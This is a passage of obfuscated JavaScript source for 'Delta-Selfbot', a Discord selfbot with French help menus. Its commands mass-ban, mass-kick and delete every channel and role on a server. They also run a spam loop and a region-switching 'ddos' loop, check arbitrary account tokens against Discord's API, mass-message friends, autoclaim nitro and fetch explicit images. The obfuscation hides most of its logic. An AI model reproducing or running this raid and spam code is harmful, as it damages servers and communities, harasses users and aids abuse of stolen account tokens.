    .setColor(color)
    .setTitle('**Pannel de Help Fun** :joy: ')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
    .addField('**' + prefix + 'avatar (@user)**', '`Affiche l\x27avatar d\x27un membre`')
    .addField('**' + prefix + 'lovecalc (@user)**', '`Test d\x27amour`')
    .addField('**' + prefix + 'nitro**', '`Genere un nitro random`')
    .addField('**' + prefix + '8ball (text)**', '`Pose une question`')
    .addField('**' + prefix + 'say (text)**', '`Affiche un text en embed`')
    .addField('**' + prefix + 'fight (@user)**', '`Bat toi avec un utilisateur`')
    .addField('**' + prefix + 'boom (@user)**', '`Fait exploser un utilisateur`')
    .addField('**' + prefix + 'rire**', '`Envoie un gif rire`')
    .addField('**' + prefix + 'kiss (@user)**', '`Embrasse un membre`')
    .addField('**' + prefix + 'veski (@user)**', '`Envoie un gif veski`')
    .addField('**' + prefix + 'load**', '`Envoie un chargement`')
    .addField('**' + prefix + 'punch (@user)**', '`Frappe un membre`')
    .addField('**' + prefix + 'calin (@user)**', '`Fait un calin a un membre`')
    .addField('**' + prefix + 'reverse (text)**', '`Met ton text a l\x27envers`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot'),
    help_moderation = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Moderation** :tools: ')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
    .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
    .addField('**' + prefix + 'shutdown**', '`Eteint le selfbot`')
    .addField('**' + prefix + 'name all**', '`Rename tout les membres d\x27un serveur`')
    .addField('**' + prefix + 'ban all**', '`Ban tout les membres d\x27un serveur`')
    .addField('**' + prefix + 'kick all**', '`Kick tout les membres d\x27un serveur`')
    .addField('**' + prefix + 'kick (@user)**', '`kick un membre du serveur`')
    .addField('**' + prefix + 'ban (@user)**', '`Ban un membre du serveur`')
    .addField('**' + prefix + 'roles list**', '`Envoie la liste de tout les roles d\x27un serveur`')
    .addField('**' + prefix + 'channels list**', '`Envoie la liste de tout les channels d\x27un serveur`')
    .addField('**' + prefix + 'purge**', '`Supprime tout les messages`')
    .addField('**' + prefix + 'delete all channel**', '`Supprime tout les salons d\x27un serveur`')
    .addField('**' + prefix + 'delete all role**', '`Supprime tout les roles d\x27un serveur`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot'),
    help_info = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
    .addField('**' + prefix + 'user info (@user)**', '`Envoie les information d\x27un membre du serveur`')
    .addField('**' + prefix + 'serveur info**', '`Envoie les information du serveur`')
    .addField('**' + prefix + 'stats**', '`Affiche les stats du selfbot`')
    .addField('**' + prefix + 'restart**', '`Redemarre le selfbot`')
    .addField('**' + prefix + 'reset**', '`Reset le status`')
    .addField('**' + prefix + 'spotify (text)**', '`Met un status spofity`')
    .addField('**' + prefix + 'role info (@role)**', '`Envoie les informations d\x27un role`')
    .addField('**' + prefix + 'encode (text)**', '`Crypte ton text en base64`')
    .addField('**' + prefix + 'discord**', '`Affiche votre version de discord js`')
    .addField('**' + prefix + 'gen token**', '`Change votre token`')
    .addField('**nitro autoclaim**', '`Un autoclaim est en permanance activé sur le self`')
    .addField('**' + prefix + 'check token (token)**', '`Vérifie si le token est valide`')
    .addField('**' + prefix + 'mp friend (message)**', '`Envoie un message privé a tout tes amis`')
    .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`Permet de changer sa maison hypesquad`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot'),
    help_nsfw = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help nsfw** :underage: ')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
    .addField('**' + prefix + 'ass**', '`Envoie une photo de fesse`')
    .addField('**' + prefix + '4k**', '`Envoie une image sexe en 4k`')
    .addField('**' + prefix + 'anal**', '`Envoie un gif anal`')
    .addField('**' + prefix + 'hentai**', '`Envoie une image/gif hentai`')
    .addField('**' + prefix + 'nsfw-gif**', '`Envoie un gif de sexe`')
    .addField('**' + prefix + 'pussy**', '`Envoie une image de chattes`')
    .addField('**' + prefix + 'thigh**', '`Envoie une image thigh`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot');
client.on('message', message => {
    const _0x53081e = _0x14ffc7;
    var _0xdcd936 = message.content[_0x53081e('0x231')](prefix[_0x53081e('0x219')])[_0x53081e('0x151')](' '),
        _0x7cd31a = message[_0x53081e('0x111')][_0x53081e('0x31')][_0x53081e('0x269')]();
    if(message[_0x53081e('0xf2')]['type'] === 'dm') {
        if(message[_0x53081e('0x1ab')][_0x53081e('0x280')]) {
            if(message.content[_0x53081e('0x3b')](_0x53081e('0x1fc'))) {
                let _0x228627 = message.author;
                _0x228627[_0x53081e('0x20e')](_0x53081e('0x1f8')).then(_0xc4a97b => {
                    const _0x378259 = _0x53081e;
                    _0xc4a97b[_0x378259('0x110')]();
                }), console[_0x53081e('0x2f')](_0x53081e('0x185')[_0x53081e('0x153')]), console[_0x53081e('0x2f')]('Log:' [_0x53081e('0x2ab')]) ^ console[_0x53081e('0x2f')](_0x53081e('0x1d5')[_0x53081e('0x153')]), console.log(_0x53081e('0x4f'), '/!/ Attention'.red, ']', (_0x53081e('0xec') + message[_0x53081e('0x1ab')]['username'] + _0x53081e('0xc8') + message.content)[_0x53081e('0x145')]), console.log(_0x53081e('0x22e')[_0x53081e('0x153')]);
            }
        }
    }
    if(message.author.id !== client[_0x53081e('0xb9')]['id']) return;
    if(message.content === prefix + 'channels list') {
        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')]('EMBED_LINKS')) return message[_0x53081e('0x179')](_0x53081e('0x146') + _0x2ec92f[_0x53081e('0x25b')](_0x4fa59a => _0x4fa59a.name));
        const _0x2ec92f = message[_0x53081e('0x133')][_0x53081e('0x19')];
        var _0x3f5f12 = new Discord.RichEmbed()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x42')](color)
            .addField(_0x53081e('0x61'), _0x2ec92f[_0x53081e('0x25b')](_0x4f8200 => _0x4f8200[_0x53081e('0x10d')]));
        for(pas = 0x0; pas < 0xa; pas++) {
            _0x3f5f12[_0x53081e('0x42')](color), message[_0x53081e('0x179')](_0x3f5f12)[_0x53081e('0x18d')](_0x2a92ae => console[_0x53081e('0x2f')]('[', 'ERROR'.red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
        }
        console.log(_0x53081e('0x2a6').yellow);
    }
    if(message.content === prefix + 'roles list') {
        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')](_0x53081e('0x121'))) return message[_0x53081e('0x179')](_0x53081e('0x146') + _0x4d72e8[_0x53081e('0x25b')](_0x5a010e => _0x5a010e.name));
        const _0x4d72e8 = message[_0x53081e('0x133')][_0x53081e('0x33')];
        var _0x126db0 = new Discord.RichEmbed()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x42')](color)[_0x53081e('0x1cd')]('liste des roles:', _0x4d72e8[_0x53081e('0x25b')](_0x290c0c => _0x290c0c[_0x53081e('0x10d')]));
        message.edit(_0x126db0)[_0x53081e('0x18d')](_0x1f78ea => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xe0')[_0x53081e('0x39')]);
    }
    message.content === prefix + _0x53081e('0x1a7') && (message[_0x53081e('0x179')](cmd)[_0x53081e('0x18d')](_0x12da3b => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xd1')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0x78') && (message[_0x53081e('0x179')](help).catch(_0x5ed11f => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console[_0x53081e('0x2f')](_0x53081e('0xe2')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0xf3') && (message[_0x53081e('0x179')](help_backup)[_0x53081e('0x18d')](_0x2a0991 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x0')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0x1da') && (message[_0x53081e('0x179')](help_hack).catch(_0x2598f5 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x1d8').yellow));
    message.content === prefix + _0x53081e('0x260') && (message[_0x53081e('0x179')](help_fun).catch(_0x5543a7 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1ef')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0x214') && (message[_0x53081e('0x179')](help_moderation)[_0x53081e('0x18d')](_0x2648b7 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x17f')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0x296') && (message[_0x53081e('0x179')](help_nsfw).catch(_0x1deffc => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x7e')[_0x53081e('0x39')]));
    message.content === prefix + _0x53081e('0x196') && (message[_0x53081e('0x179')](help_info)[_0x53081e('0x18d')](_0x4489c8 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console[_0x53081e('0x2f')](_0x53081e('0x2a1')[_0x53081e('0x39')]));;
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1c') || prefix + 'pp')) {
        const _0x3b34f4 = message[_0x53081e('0x111')][_0x53081e('0x31')][_0x53081e('0x269')]() || message.author,
            _0x30f36f = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x43')](_0x3b34f4.username)[_0x53081e('0x4c')](_0x3b34f4[_0x53081e('0xaf')])
            .setColor(color)[_0x53081e('0x1ca')](_0x53081e('0x191'));
        message[_0x53081e('0x179')](_0x30f36f)[_0x53081e('0x18d')](_0x349fc3 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x2e')[_0x53081e('0x39')]);
    };
    if(message.content === prefix + _0x53081e('0x13c')) {
        let _0x13709e = _0x53081e('0x1f3');
        request(_0x13709e, {
            'method': _0x53081e('0x24a'),
            'headers': {
                'authorization': token,
                'content-type': _0x53081e('0x14c'),
                'User-Agent': _0x53081e('0x1f4')
            },
            'body': JSON[_0x53081e('0x236')]({
                'house_id': 0x2
            })
        }), message[_0x53081e('0x179')](_0x53081e('0x190')), console[_0x53081e('0x2f')](_0x53081e('0xf1').yellow);
    }
    if(message.content === prefix + _0x53081e('0xab')) {
        let _0x5c5a2e = 'https://discordapp.com/api/v6/hypesquad/online';
        request(_0x5c5a2e, {
            'method': 'POST',
            'headers': {
                'authorization': token,
                'content-type': _0x53081e('0x14c'),
                'User-Agent': _0x53081e('0x1f4')
            },
            'body': JSON.stringify({
                'house_id': 0x3
            })
        }), message[_0x53081e('0x179')](_0x53081e('0x1')), console[_0x53081e('0x2f')](_0x53081e('0xf1')[_0x53081e('0x39')]);
    }
    if(message.content === prefix + _0x53081e('0x127')) {
        let _0x23ef13 = _0x53081e('0x1f3');
        request(_0x23ef13, {
            'method': _0x53081e('0x24a'),
            'headers': {
                'authorization': token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            'body': JSON.stringify({
                'house_id': 0x1
            })
        }), message[_0x53081e('0x179')](':white_check_mark: **Vous avez rejoint la hypesquad \x27bravery\x27**'), console[_0x53081e('0x2f')](_0x53081e('0xf1')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x279'))) {
        let _0x1a62b1 = _0xdcd936[_0x53081e('0xf8')](0x2)['join'](' '),
            _0x3fadd = 'https://discordapp.com/api/v6/users/@me';
        request(_0x3fadd, {
            'method': _0x53081e('0x22'),
            'headers': {
                'authorization': _0x1a62b1
            }
        }, function(_0x15df75, _0xb5d4b0, _0x8b9641) {
            const _0x3ea1d5 = _0x53081e;
            if(_0xb5d4b0.statusCode === 0xc8) {
                var _0x3a6c25 = new Discord[(_0x3ea1d5('0x226'))]()[_0x3ea1d5('0xc9')]('Token info')[_0x3ea1d5('0x1f6')](_0x3ea1d5('0xbd') + _0x1a62b1 + _0x3ea1d5('0x29'))[_0x3ea1d5('0x42')](color)[_0x3ea1d5('0x1c4')]()[_0x3ea1d5('0x1ca')](_0x3ea1d5('0x41'), message[_0x3ea1d5('0x1ab')][_0x3ea1d5('0xaf')]);
                message[_0x3ea1d5('0x179')](_0x3a6c25)[_0x3ea1d5('0x18d')](_0x11bd68 => console[_0x3ea1d5('0x2f')]('[', _0x3ea1d5('0xf9')[_0x3ea1d5('0x2ab')], ']', _0x3ea1d5('0xa3').green));
            } else {
                var _0x4cc0d9 = new Discord[(_0x3ea1d5('0x226'))]()
                    .setTitle(_0x3ea1d5('0x17e'))[_0x3ea1d5('0x1f6')](_0x3ea1d5('0x9c') + _0x1a62b1 + ' \x0an\x27est pas valide :x:')[_0x3ea1d5('0x42')](color)[_0x3ea1d5('0x1c4')]()[_0x3ea1d5('0x1ca')](_0x3ea1d5('0x41'), message[_0x3ea1d5('0x1ab')][_0x3ea1d5('0xaf')]);
                message[_0x3ea1d5('0x179')](_0x4cc0d9)[_0x3ea1d5('0x18d')](_0x1d6010 => console[_0x3ea1d5('0x2f')]('[', 'ERROR' [_0x3ea1d5('0x2ab')], ']', _0x3ea1d5('0xa3')[_0x3ea1d5('0x145')])), console[_0x3ea1d5('0x2f')](_0x3ea1d5('0x27a')[_0x3ea1d5('0x39')]);
            }
        });
    }
    if(message.content == prefix + _0x53081e('0x158')) {
        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](_0x53081e('0x99'));
        let _0xa5457c = 0x0;
        const _0x2764b5 = [_0x53081e('0xcb'), _0x53081e('0x239'), _0x53081e('0x53'), _0x53081e('0x93'), 'brazil', _0x53081e('0x166')];
        setInterval(() => {
            const _0x27bafc = _0x53081e;
            message[_0x27bafc('0x133')][_0x27bafc('0x161')](_0x2764b5[_0xa5457c]), _0xa5457c++;
            if(_0xa5457c == _0x2764b5[_0x27bafc('0x219')]) _0xa5457c = 0x0;
        }, 0x3e8), message.edit(_0x53081e('0xee')), console[_0x53081e('0x2f')](_0x53081e('0x1be')[_0x53081e('0x39')]);
    }
    if(message.content == prefix + _0x53081e('0x2a')) {
        if(!message.guild) return message.edit(_0x53081e('0x99'));
        clearInterval(), message[_0x53081e('0x179')]('**Commande ddos stopé**'), console[_0x53081e('0x2f')](_0x53081e('0x1e5')[_0x53081e('0x39')]);
    }
    if(message.content.startsWith(prefix + _0x53081e('0x1b'))) {
        if(!message.guild) return message[_0x53081e('0x179')](':x: **Commande uniquement utilisable sur un serveur**');
        let _0xabd69c = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta Selfbot';
        message[_0x53081e('0x179')]('**Wait...**'), setInterval(() => {
            const _0x294344 = _0x53081e;
            message.channel[_0x294344('0x20e')](_0xabd69c)[_0x294344('0x18d')](_0x3854de => console[_0x294344('0x2f')]('[', _0x294344('0xf9').red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 0x3e8), console.log(_0x53081e('0x4d')[_0x53081e('0x39')]);
    }
    if(message.content == prefix + _0x53081e('0x172')) {
        if(!message[_0x53081e('0x133')]) return message.edit(_0x53081e('0x99'));
        clearInterval(), message[_0x53081e('0x179')](_0x53081e('0x174')), client.destroy()[_0x53081e('0xdb')](() => client[_0x53081e('0x8c')](token)), console.log('Commande spam stopé' [_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x264'))) {
        let _0x1da338 = message.content[_0x53081e('0x151')](' ')[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ');
        var _0xcac471 = [_0x53081e('0xe8'), _0x53081e('0x1fa'), _0x53081e('0x26e'), _0x53081e('0x1ae'), _0x53081e('0x96'), _0x53081e('0x273'), 'tu peux essayer...'];
        if(_0x1da338[0x1] != null) message.edit(_0x1da338 + _0x53081e('0x16d') + _0xcac471[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0xcac471[_0x53081e('0x219')])])[_0x53081e('0x18d')](_0x32e238 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
        else message[_0x53081e('0x179')](_0x53081e('0x5c') + prefix + ' 8ball [question])');
        console[_0x53081e('0x2f')](_0x53081e('0x288')[_0x53081e('0x39')]);
    };
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xb4'))) {
        if(!_0xdcd936) throw 'Vous devez mettre quelque chose à dire !';
        let _0x1ff8bc = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta Selfbot';
        message[_0x53081e('0x179')](_0x1ff8bc)[_0x53081e('0x18d')](_0x4b8556 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x13').yellow);
    };
    if(message.content.startsWith(prefix + _0x53081e('0xe'))) {
        if(!_0xdcd936) throw _0x53081e('0x152');
        let _0xe610e1 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta selfbot',
            _0x40883b = new Discord[(_0x53081e('0x226'))]()
            .setTitle('**Commande Say**')
.setDescription(_0xe610e1)[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x1d4'), '' + client[_0x53081e('0xb9')][_0x53081e('0xaf')])
            .setColor(color);
        for(pas = 0x0; pas < 0xa; pas++) {
            _0x40883b[_0x53081e('0x42')](color), message[_0x53081e('0x179')](_0x40883b)[_0x53081e('0x18d')](_0x2a5657 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
        }
        console[_0x53081e('0x2f')](_0x53081e('0x13')[_0x53081e('0x39')]);
    };
    if(message.content.startsWith(prefix + _0x53081e('0x1b5'))) {
        if(!_0x7cd31a) return message.edit(':x: **Utilisateur inconnu!**'), _0x7cd31a = message[_0x53081e('0x1ab')];
        var _0x58a160 = message[_0x53081e('0x133')][_0x53081e('0x209')](_0x7cd31a),
            _0x189f21 = _0x7cd31a[_0x53081e('0x14e')]['game'],
            _0x4dbf6b = _0x189f21 ? _0x189f21.name : 'Nothing',
            _0x2b11ba = !_0x58a160 ? null : _0x58a160[_0x53081e('0x33')]['array']();
        if(_0x58a160) {
            _0x2b11ba.shift();
            for(var _0x127ab8 = 0x0; _0x127ab8 < _0x2b11ba[_0x53081e('0x219')]; ++_0x127ab8) {
                _0x2b11ba[_0x127ab8] = _0x2b11ba[_0x127ab8][_0x53081e('0x10d')];
            }
            _0x2b11ba = _0x2b11ba[_0x53081e('0x28d')](', ');
        };
        var _0x1d6989 = {
            'dnd': _0x53081e('0x14a'),
            'offline': _0x53081e('0x259'),
            'online': _0x53081e('0x171'),
            'idle': _0x53081e('0x3a')
        };
        const _0xf1e4cf = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x43')](_0x7cd31a[_0x53081e('0x27c')] + '#' + _0x7cd31a[_0x53081e('0x1bc')] + _0x53081e('0x170') + _0x7cd31a.id, _0x7cd31a[_0x53081e('0x2a7')])[_0x53081e('0x1ca')]('Delta-Selfbot')[_0x53081e('0x15f')](_0x7cd31a[_0x53081e('0x2a7')])[_0x53081e('0x42')](color)[_0x53081e('0x1cd')](_0x53081e('0x150'), _0x7cd31a[_0x53081e('0x245')][_0x53081e('0x258')]()['substr'](0x0, 0xf) + ',\x0a' + checkDays(_0x7cd31a[_0x53081e('0x245')]), !![])
            .addField(_0x53081e('0xcf'), _0x58a160.joinedAt.toString()[_0x53081e('0x34')](0x0, 0xf) + ',\x0a' + checkDays(_0x58a160[_0x53081e('0x162')]), !![])[_0x53081e('0x1cd')](_0x53081e('0xe9'), _0x1d6989[_0x7cd31a[_0x53081e('0x14e')][_0x53081e('0x9')]], !![])[_0x53081e('0x1cd')]('Playing', _0x4dbf6b, !![])[_0x53081e('0x1cd')](_0x53081e('0x16e'), _0x58a160[_0x53081e('0x224')] ? _0x58a160[_0x53081e('0x224')] : 'None', !![])[_0x53081e('0x1cd')](_0x53081e('0x176'), _0x53081e('0x82') + _0x7cd31a.displayAvatarURL + ')', !![])[_0x53081e('0x1cd')](_0x53081e('0x167'), _0x2b11ba ? _0x2b11ba : _0x53081e('0xd2'));
        message.edit(_0xf1e4cf)[_0x53081e('0x18d')](_0x1e094e => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0xcc')[_0x53081e('0x39')]);
    };
    if(message.content === prefix + _0x53081e('0x75')) {
        if(!message[_0x53081e('0x133')]) return message[_0x53081e('0x179')](_0x53081e('0x99'));
        const _0x304e57 = new Date()[_0x53081e('0xa7')]() - message[_0x53081e('0x133')]['createdAt'][_0x53081e('0xa7')](),
            _0x35de58 = _0x304e57 / 0x3e8 / 0x3c / 0x3c / 0x18,
            _0x4cad35 = [_0x53081e('0xd2'), _0x53081e('0x40'), 'Medium', _0x53081e('0x1e7'), _0x53081e('0x13d')];
        let _0x1d3c98 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x53081e('0x2a5'))[_0x53081e('0x1cd')](_0x53081e('0x1c2'), '' + message[_0x53081e('0x133')][_0x53081e('0x10d')])[_0x53081e('0x1cd')]('Created On:', message[_0x53081e('0x133')][_0x53081e('0x245')]['toString']()['substr'](0x0, 0xf) + ',\x0a' + checkDays(message[_0x53081e('0x133')][_0x53081e('0x245')]), !![])[_0x53081e('0x1cd')]('Default Channel:', '' + message[_0x53081e('0x133')][_0x53081e('0xc5')])[_0x53081e('0x1cd')](_0x53081e('0x25d'), '' + message[_0x53081e('0x133')][_0x53081e('0x26f')])
            .addField(_0x53081e('0x1eb'), message[_0x53081e('0x133')][_0x53081e('0x107')][_0x53081e('0x1b6')](_0x49aa6f => _0x49aa6f[_0x53081e('0x14e')][_0x53081e('0x9')] !== _0x53081e('0x1d2'))[_0x53081e('0x1c1')] + _0x53081e('0x120') + message.guild[_0x53081e('0x215')])[_0x53081e('0x1cd')](_0x53081e('0x28c'), '' + message[_0x53081e('0x133')][_0x53081e('0x129')][_0x53081e('0xb9')][_0x53081e('0x27c')])[_0x53081e('0x1cd')](_0x53081e('0x1c3'), '' + message[_0x53081e('0x133')][_0x53081e('0x19')][_0x53081e('0x1b6')](_0x13cf92 => _0x13cf92[_0x53081e('0xc6')] === 'text')['size'])[_0x53081e('0x1cd')](_0x53081e('0xbf'), '' + message[_0x53081e('0x133')][_0x53081e('0x19')]['filter'](_0x2c8d37 => _0x2c8d37.type === _0x53081e('0x16'))['size'])[_0x53081e('0x1cd')](_0x53081e('0x11b'), '' + _0x4cad35[message[_0x53081e('0x133')][_0x53081e('0x49')]])
            .addField(_0x53081e('0xb5'), '' + message.guild.roles[_0x53081e('0x1c1')])
            .addField(_0x53081e('0x235'), '' + message.guild.id)[_0x53081e('0x42')](color);
        message.guild[_0x53081e('0x293')] != null && _0x1d3c98[_0x53081e('0x15f')]('' + message[_0x53081e('0x133')][_0x53081e('0x293')]), message[_0x53081e('0x179')](_0x1d3c98)[_0x53081e('0x18d')](_0x59c673 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande serveur info effectué' [_0x53081e('0x39')]);
    };
    if(message.content === prefix + 'stats') {
        let _0x363611 = new Discord.RichEmbed();
        _0x363611[_0x53081e('0x1c4')]()
            .setColor(color)
            .setTitle(_0x53081e('0x87'))[_0x53081e('0x1cd')](_0x53081e('0x7f'), (process[_0x53081e('0x206')]()[_0x53081e('0x12b')] / 0x400 / 0x400)[_0x53081e('0x90')](0x2) + 'MB')
            .addField(_0x53081e('0x5f'), '' + client.guilds.size)[_0x53081e('0x1cd')](_0x53081e('0x159'), '' + client.channels[_0x53081e('0x1c1')])[_0x53081e('0x1cd')](_0x53081e('0x38'), '' + client.guilds.map(_0x536a2c => _0x536a2c[_0x53081e('0x215')]))[_0x53081e('0x1cd')](_0x53081e('0x5f'), '' + client[_0x53081e('0x7d')][_0x53081e('0x1c1')])[_0x53081e('0x1cd')](_0x53081e('0x5f'), '' + client[_0x53081e('0x7d')][_0x53081e('0x1c1')])
.setFooter(_0x53081e('0x191'), '' + client[_0x53081e('0xb9')][_0x53081e('0xaf')]);
        if(client[_0x53081e('0xb9')][_0x53081e('0x5b')] > 0x0) _0x363611[_0x53081e('0x1cd')](_0x53081e('0x2aa'), _0x53081e('0x23c'));
        else _0x363611.addField(_0x53081e('0x2aa'), _0x53081e('0xac'));
        message[_0x53081e('0x179')](_0x363611)[_0x53081e('0x18d')](_0x522e2c => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x98')[_0x53081e('0x39')]);
    }
    message.content[_0x53081e('0x64')](prefix + 'ass') && (superagent[_0x53081e('0x89')](_0x53081e('0x1d1'))[_0x53081e('0x255')]({
        'type': 'ass'
    })[_0x53081e('0x2a4')]((_0x436e26, _0x48d20d) => {
        const _0x336cbd = _0x53081e;
        var _0xf8e542 = new Discord.RichEmbed()[_0x336cbd('0x42')](color)[_0x336cbd('0x1ca')](_0x336cbd('0x191'))
            .setTimestamp()
.setImage(_0x48d20d[_0x336cbd('0xde')]['message'])
            .setColor(color);
        message[_0x336cbd('0x179')](_0xf8e542)[_0x336cbd('0x18d')](_0xb36534 => console.log('[', 'ERROR' [_0x336cbd('0x2ab')], ']', _0x336cbd('0xa3')[_0x336cbd('0x145')]));
    }), console[_0x53081e('0x2f')](_0x53081e('0x1a0').yellow));
    message.content[_0x53081e('0x64')](prefix + '4k') && superagent[_0x53081e('0x89')]('https://nekobot.xyz/api/image')[_0x53081e('0x255')]({
        'type': '4k'
    })[_0x53081e('0x2a4')]((_0x230855, _0xf3a7ff) => {
        const _0x575241 = _0x53081e;
        var _0x455df3 = new Discord[(_0x575241('0x226'))]()[_0x575241('0x1ca')](_0x575241('0x191'))[_0x575241('0x1c4')]()[_0x575241('0x4c')](_0xf3a7ff[_0x575241('0xde')][_0x575241('0x1c8')])[_0x575241('0x42')](color);
        message.edit(_0x455df3)[_0x575241('0x18d')](_0x43aeb6 => console[_0x575241('0x2f')]('[', _0x575241('0xf9')[_0x575241('0x2ab')], ']', _0x575241('0xa3').green)), console[_0x575241('0x2f')](_0x575241('0x17b')[_0x575241('0x39')]);
    });
    if(message.content[_0x53081e('0x64')](prefix + 'nsfw-gif')) {
        var _0x46ece8 = new Discord[(_0x53081e('0x226'))]();
        superagent.get(_0x53081e('0x1d1'))[_0x53081e('0x255')]({
            'type': _0x53081e('0x50')
        })[_0x53081e('0x2a4')]((_0x40302f, _0x20dc48) => {
            const _0x2202bc = _0x53081e;
            var _0x246be4 = new Discord[(_0x2202bc('0x226'))]()
